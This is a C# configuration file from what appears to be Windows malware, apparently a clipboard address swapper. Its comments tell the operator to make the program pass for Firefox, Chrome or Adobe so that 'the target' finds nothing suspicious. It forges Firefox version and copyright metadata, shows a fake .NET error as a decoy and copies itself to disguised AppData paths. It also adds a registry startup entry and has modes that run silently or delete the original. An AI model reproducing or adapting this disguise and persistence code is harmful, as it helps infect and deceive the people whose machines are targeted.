using System;
using System.IO;
using Main.Tools;

namespace Main
{
    internal static class Config
    {
        #region Hiding
        
        /* You want to use a very usual software parameters here,
         * like Firefox, Chrome, AdobeUpdate, etc...
         * This is what the target will see when it checks the running processes.
         * Therefore it shall be not suspicious.
         */
        internal const string AssemblyProdutAndTitle = @"Firefox";
        internal const string AssemblyCopyright =
            @"Copyright 1999-2012 Firefox and Mozzilla developers. All rights reserved.";
        internal const string AssemblyVersion = @"37.0.2.5583";
        #endregion
        static Config()
        {
            var appDataRoamingPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            #region Hiding
#if DEBUG
            StartMode = StartModeType.Debug;
#else
            StartMode = StartModeType.ErrorMessage;
#endif
            ErrorMessage = "To run this application, you first must install one of the following version of the .NET Framework:" + Environment.NewLine +
                ".NET Framework, Version = 4.5.1";
            ErrorTitle = ".NET Framework Initialization Error";
            
            StartupMethod = WinStartup.StartupMethodType.Registry;

            /* The software copies here.
             * Examples:
             * @"Adobe (x86)\AcroRd32.exe";
             * @"Google (x86)\Chrome32.exe";
             * @"Drpbx\drpbx.exe";
             * @"Frfx\firefox.exe";
             */
            TempExeRelativePath = @"Drpbx\drpbx.exe";
            FinalExeRelativePath = @"Frfx\firefox.exe";

            FinalExePath = Path.Combine(appDataRoamingPath, FinalExeRelativePath);

            // Set true if you don't want the software to change addresses right away.
            OnlyRunAfterSysRestart = false;

            #endregion
        }

        #region Hiding

        internal enum StartModeType
        {
            /// <summary>
            /// Debug message at start. 
            /// Doesn't copy itself anywhere. 
            /// Doesn't start with Windows.
            /// </summary>
            Debug,

            /// <summary>
            /// Shows an error message.
            /// Copies itself to hidden places. 
            /// Starts with Windows.
            /// </summary>
            ErrorMessage,

            /// <summary>
            /// Doesn't show any windows. 
            /// Copies itself to hidden places, don't delete itself. 
            /// Starts with Windows.
            /// </summary>
            NothingHappens,

            /// <summary>
            /// Doesn't show any windows. 
            /// Copies itself to hidden places, then delete itself.
            /// Start with Windows.
            /// </summary>
            DeleteItself
        }
#if DEBUG
        internal static StartModeType StartMode;
#else
        internal static StartModeType StartMode;
#endif
        internal static string ErrorMessage;
        internal static string ErrorTitle;

        

        internal static WinStartup.StartupMethodType StartupMethod;
        internal static string TempExeRelativePath;
        internal static string FinalExeRelativePath;
        internal static string FinalExePath;

        internal static bool OnlyRunAfterSysRestart;

#endregion
    }
}
